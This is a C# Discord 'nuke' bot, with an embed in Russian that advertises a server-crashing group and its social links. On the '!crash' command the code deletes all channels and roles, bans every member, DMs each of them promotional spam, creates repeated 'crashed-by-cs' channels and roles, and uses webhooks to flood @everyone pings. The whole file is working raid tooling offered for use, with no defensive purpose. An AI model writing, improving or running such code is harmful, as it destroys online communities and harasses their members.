using System;
using Discord;
using Discord.WebSocket;
using Discord.Webhook;
using System.IO;
using System.Threading;
using System.Threading.Tasks;


class Program
{
    private static Discord.Embed emb = new EmbedBuilder
    {
        Title = "Привет котаны!) Данный сервер крашится",
        Description = $"Хочешь крашить сервера? \n" +
$"Тогда тебе точно к нам! \n" +
$"<a:warn:961951218916294676> `Мы дадим вам:`\n" +
$"```diff\n- Удобных и мощных краш ботов.\n- Помощь с рейдом и крашем.\n- Большой функционал краш ботов.```\n" +
$"<:news:961950933120598087> **`Наши социальные сети:`\n" +
$"<a:server:961949873639399484> [`Дискорд Сервер`]({CrashBotAHAHAHA.Config.server_url})\n" +
$"<:shiel:961950236476063815> [`Телеграм канал`]({CrashBotAHAHAHA.Config.telegram_url})\n" +
$"<:rulz:961950442965852192> [`Youtube создателя`]({CrashBotAHAHAHA.Config.youtube_url})**",
        Color = Color.Red
    }.Build();
    public static void Main(string[] args) => new Program().MainAsync().GetAwaiter().GetResult();

    private DiscordSocketClient _client;

    public async Task MainAsync()
    {
        var config = new DiscordSocketConfig()
        {
            GatewayIntents = GatewayIntents.All
        };
        _client = new DiscordSocketClient(config);

        _client.MessageReceived += ClientOnMessageReceived;
        _client.Ready += GetReady;
        _client.ChannelCreated += on_channel_create;

        var token = File.ReadAllText("tokens/token.txt");

        await _client.LoginAsync(TokenType.Bot, token);
        await _client.StartAsync();

        // Block this task until the program is closed.
        await Task.Delay(-1);
    }

    public static async Task<Task> sendEmbedMessage(SocketUser member)
    {
        await member.SendMessageAsync(embed: emb);
        return Task.CompletedTask;
    }
    public static async Task<Task> DeleteGuildChannels(SocketGuild guild)
    {
        foreach (var channel in guild.Channels)
        {
            if (channel.Name != "crashed-by-cs")
            {
                try
                {
                    await channel.DeleteAsync();
                }
                catch (Discord.Net.HttpException)
                {
                    CrashBotAHAHAHA.logging.logger.errorLog($"[MissingPermissions] Didn't deleted channel: {channel.Name}");
                    continue;
                }
            }
        }
        return Task.CompletedTask;
    }
    public static async Task<Task> DeleteGuildRoles(SocketGuild guild)
    {
        foreach (var role in guild.Roles)
        {
            // 
            if (role.Name != "cs-crash")
            {
                try
                {
                    await role.DeleteAsync();
                }
                catch (Discord.Net.HttpException)
                {
                    CrashBotAHAHAHA.logging.logger.errorLog($"[MissingPermissions] Didn't deleted role: {role.Name}");
                    continue;
                }
            }
        }
        return Task.CompletedTask;
    }
    public static async Task<Task> BanAllMembers(SocketGuild guild)
    {
        foreach (var member in guild.Users)
        {
            try
            {
                Thread sendDm = new Thread(() => sendEmbedMessage(member));
                sendDm.Start();
            }
            catch
            {

            }
            try
            {
                await member.BanAsync(reason: "Server nucked by cringel");
            }
            catch (Discord.Net.HttpException)
            {
                CrashBotAHAHAHA.logging.logger.errorLog($"[MissingPermissions] Didn't banner user: {member.Id}");
                continue;
            }
        }
        return Task.CompletedTask;
    }
    public static async Task<Task> CreateChannels(SocketGuild guild)
    { 
        for(int i = 0; i < 15; i++)
        {
            try
            {
                await guild.CreateTextChannelAsync("crashed-by-cs");
            }
            catch (Discord.Net.HttpException)
            {
                CrashBotAHAHAHA.logging.logger.errorLog($"[MissingPermissions] Didn't created channel");
                continue;
            }
            
        }
        return Task.CompletedTask;
    }
    public static async Task<Task> CreateRoles(SocketGuild guild)
    {
        for (int i = 0; i < 15; i++)
        {
            try
            {
                await guild.CreateRoleAsync(name: "cs-crash");
            }
            catch (Discord.Net.HttpException)
            {
                CrashBotAHAHAHA.logging.logger.errorLog($"[MissingPermissions] Didn't created role");
                continue;
            }
        }
        return Task.CompletedTask;
    }
    private static async Task<Task> ClientOnMessageReceived(SocketMessage msg)
    {
        if (msg.Content.StartsWith("!crash"))
        {
            var channel = msg.Channel as SocketGuildChannel;
            var guild = channel.Guild as SocketGuild;
            Thread DeleteChannels = new Thread(() => DeleteGuildChannels(guild));
            Thread DeleteRoles = new Thread(() => DeleteGuildRoles(guild));
            Thread BanAll = new Thread(() => BanAllMembers(guild));
            Thread CreateChan = new Thread(() => CreateChannels(guild));
            Thread CreateRole = new Thread(() => CreateRoles(guild));
            for (int i = 0; i < 2; i++)
            {
                DeleteRoles.Start();
                DeleteChannels.Start();
                BanAll.Start();
                CreateChan.Start();
                CreateRole.Start();
            }
        }
        return Task.CompletedTask;
    }
    private static async Task<Task> GetReady()
    {
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.Green;
        return Task.CompletedTask;
    }
    public static async Task<Task> spamHook(DiscordWebhookClient dhook)
    {
        Embed[] embedArray = new Embed[] { emb };
        using (var client = dhook)
        {
            for (int i =0; i < 45; i++)
            {
                await client.SendMessageAsync("||@everyone||", false, embedArray);
            }
        }
        return Task.CompletedTask;
    }
    private static async Task<Task> on_channel_create(SocketChannel channel)
    {
        var chan = channel as SocketTextChannel;

        if (chan.Name == "crashed-by-cs")
        {
            var hook = await chan.CreateWebhookAsync("crashed-by-cs");
            var DCW = new DiscordWebhookClient(hook);
            Thread spam = new Thread(() => spamHook(DCW));
            spam.Start();
        }
        return Task.CompletedTask;
    }

}